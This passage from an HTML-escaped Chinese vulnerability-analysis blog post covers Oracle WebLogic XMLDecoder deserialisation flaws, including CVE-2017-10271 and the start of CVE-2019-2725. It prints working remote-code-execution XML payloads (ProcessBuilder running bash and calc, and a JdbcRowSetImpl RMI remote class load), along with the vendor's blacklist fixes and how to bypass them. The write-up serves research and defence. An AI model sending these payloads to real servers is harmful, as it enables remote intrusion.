&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>/bin/bash&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">index=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>-c&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">index=&lt;/span>&lt;span style="color:#d88200">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>touch /tmp/123&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/array&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">method=&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">/&amp;gt;&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/work:WorkContext&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soapenv:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soapenv:Body/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soapenv:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soap:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>xerces之后，先在DocumentHandler分配标签处理的具体方法（此处是JavaElementHandler），再进入具体处理&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011152830560.png" alt="image-20221011152830560">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011152944141.png" alt="image-20221011152944141">&lt;/p>
&lt;p>之后会用类似的方式处理java.lang.ProcessBuilder和java.lang.String，最后再ObjectElementHandler中用Expression对象完成命令执行&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011155723343.png" alt="image-20221011155723343">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011155607516.png" alt="image-20221011155607516">&lt;/p>
&lt;h4 id="weblogic部分">Weblogic部分&lt;/h4>
&lt;p>weblogic中对wsdl的soap消息体解析依赖XMLDecoder，不需要鉴权&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011160637479.png" alt="image-20221011160637479">&lt;/p>
&lt;p>weblogic.wsee.workarea.WorkContextXmlInputAdapter这个类是调用XMLDecoder前的最后一步，之后所有的fix也都从这里下手，用黑名单方式阻止恶意内容进入XMLDecoder&lt;/p>
&lt;h3 id="fix">fix&lt;/h3>
&lt;p>在&lt;code>weblogic.wsee.workarea.WorkContentXmlInputAdapter&lt;/code>中增加了&lt;code>validate&lt;/code>方法（专门处理过滤问题的）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">validate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">WebLogicSAXParserFactory&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WebLogicSAXParserFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SAXParser&lt;/span> &lt;span style="color:#111">parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newSAXParser&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parser&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DefaultHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">startElement&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">localName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Attributes&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SAXException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;object&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid context type: object&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ParserConfigurationException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Parser Exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">SAXException&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Parser Exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Parser Exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>遇到Object标签就抛出异常，是真的蠢&lt;/p>
&lt;h2 id="cve-2017-10271">CVE-2017-10271&lt;/h2>
&lt;p>针对上面的过滤，我们直接把object换成void或者new就行了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&lt;/span> &lt;span style="color:#75af00">version=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1.4.0&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.beans.XMLDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;new&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>calc&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;method&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/new&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&lt;/span> &lt;span style="color:#75af00">version=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1.8.0_131&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.beans.XMLDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataSourceName&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>rmi://localhost:1099/Exploit&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;autoCommit&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;boolean&amp;gt;&lt;/span>true&lt;span style="color:#f92672">&amp;lt;/boolean&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面这个poc生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口时会根据dataSourceName的值去远程加载一个类初始化，我们可以用rmi&lt;/p>
&lt;h3 id="fix-1">fix&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">validate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">WebLogicSAXParserFactory&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WebLogicSAXParserFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SAXParser&lt;/span> &lt;span style="color:#111">parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newSAXParser&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parser&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DefaultHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">overallarraylength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">startElement&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">localName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Attributes&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SAXException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;object&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid element qName:object&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;new&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid element qName:new&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid element qName:method&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;void&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">attClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">attClass&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">attClass&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getQName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">attClass&lt;/span>&lt;span style="color:#f92672">)))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid attribute for element void:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getQName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">attClass&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">qName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;array&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var9&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var9&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;byte&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalStateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;The value of class attribute is not valid for array element.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>依旧黑名单，加上了new和void和method的元素节点，其次限制了void元素只能使用index属性或者空属性，array标签如果使用class属性 那么值必须是byte，还是比较有效的，限制了调用任意方法&lt;/p>
&lt;h2 id="cve-2019-2725">CVE-2019-2725&lt;/h2>
&lt;p>换了个组件日，&lt;code>_async&lt;/code>，同时绕过了上面的fix&lt;/p>
&lt;p>*写在前面：我痛恨一切没有认真复现，拿着2017年的payload打2019年的cve的行为。&lt;/p>
&lt;h3 id="过程分析-1">过程分析&lt;/h3>
&lt;p>按0day的分析思路来，首先看官方通报是wls9_async_response组件在处理http消息时存在反序列化rce的漏洞，用11g做测试环境，定位到/lib/bea_wls9_async_response.war，先看一下web.xml（组件对应的web路径）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012103847685.png" alt="image-20221012103847685">&lt;/p>
&lt;p>有不少url- pattern，但直接访问都是404，这个故事告诉我们weblogic查看路径只需要直接看对应组件的weblogic-webservices.xml即可&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012104019544.png" alt="image-20221012104019544">&lt;/p>
&lt;p>访问/_async/AsyncResponseBean可以看到测试界面，结合公告中的漏洞处置建议，禁止 &lt;code>/_async/*&lt;/code> 路径的URL访问，可以大概率猜测漏洞入口在这里&lt;/p>
